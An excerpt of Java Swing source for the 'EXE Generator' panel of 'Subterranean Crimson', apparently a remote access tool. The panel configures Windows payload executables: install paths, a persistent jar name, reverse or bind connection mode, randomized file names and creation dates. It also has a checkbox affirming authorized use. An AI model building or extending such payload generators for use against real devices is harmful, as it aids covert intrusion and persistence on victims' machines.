package subterranean.crimson.server.graphics.panels.generate.exe;
...
import subterranean.crimson.server.generation.EXE;
...
public class Main extends JPanel {
	...
	public Main(GenerateEXE p) {
		...
		if (Server.getSettings().isInformationPanels()) {
			...
			txtrTheJarPayload.setText("The EXE Generator can generate Windows executables.");
		...
		final Options savedValues = Server.getSettings().getSavedIpaPayloadOptions();
		...
		restore_panel.setBounds(12, 12, 547, 78);
		...
		info_panel.setBounds(12, 102, 547, 159);
		...
		JLabel lblJarCreationDate = new JLabel("Payload Creation Date:");
		...
		JLabel lblInstalledJarCreation = new JLabel("PermaJar Creation Date:");
		...
		executionPane.addTab("Paths", null, panel_2, null);

		panel_3 = new JPanel();
		panel_3.setLayout(null);
		panel_3.setBorder(new TitledBorder(null, "Windows", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		panel_3.setBounds(10, 12, 490, 75);
		panel_2.add(panel_3);

		label = new JLabel("Install Path:");
		...
		comboBox_3.setToolTipText("Select an install path from the list or type your own.");
		comboBox_3.setFont(new Font("Dialog", Font.BOLD, 10));
		comboBox_3.setEditable(true);
		comboBox_3.setBounds(97, 17, 381, 23);
		...
		textField.setText("cr.jar");
		textField.setColumns(10);
		textField.setBounds(97, 47, 114, 19);
		panel_3.add(textField);

		button = new JButton("Randomize");
		button.setFont(new Font("Dialog", Font.BOLD, 9));
		button.setBounds(223, 47, 88, 19);
		panel_3.add(button);
		...
		rdbtnReverse.setEnabled(false);
		rdbtnReverse.setSelected(true);
		rdbtnReverse.setBounds(366, 23, 90, 24);
		com_panel.add(rdbtnReverse);

		JRadioButton rdbtnBind = new JRadioButton("Bind");
		rdbtnBind.setEnabled(false);
		rdbtnBind.setBounds(460, 23, 75, 24);
		com_panel.add(rdbtnBind);
			...
			public void mousePressed(MouseEvent e) {
				...
				if (!installed_date.equals("[CURRENT]")) {
					try {
						...
						// Wrong date format
						Logger.add("Failed to parse installed exe date");
				...
				opts.windows = new Path(((String) comboBox_3.getSelectedItem()), textField.getText());
				...
				Thread p = new EXE(opts, Path.toUnix(textField_output_path.getText()), textField_output_name.getText(), Pdate.getTime());
				p.start();
				//
				parent.dispose();
			}
		...
		btnRandomizeName.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				textField_output_name.setText(subterranean.crimson.universal.Utilities.nameGen(5) + ".exe");
		...
		chckbxIWillBe = new JCheckBox("I will use this EXE to install Crimson only on devices that I have authorization to do so.");
		...
		if (!Version.release) {
			textField_output_name.setText("payload.exe");
		}
	...
	public void save(Options opts) {
		...
		Server.getSettings().setSavedExePayloadOptions(opts);
	}
